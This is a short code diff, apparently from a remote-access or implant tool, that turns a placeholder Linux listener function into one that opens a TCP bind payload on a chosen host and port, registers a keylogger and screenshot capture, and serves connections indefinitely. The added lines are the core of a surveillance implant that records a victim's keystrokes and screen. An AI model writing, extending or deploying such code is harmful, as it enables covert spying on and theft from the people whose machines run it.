@@ -19,8 +19,13 @@ def _linux_connect(args):
 
 
 def _linux_listen(args):
-    print(args)
-    print('listening')
+    addr = args.host, args.port
+
+    with payload.TCPBindPayload(addr) as p:
+        p.register_keylogger()
+        p.register_screenshot()
+
+        p.serve_forever()
 
 
 def _windows_main(args):
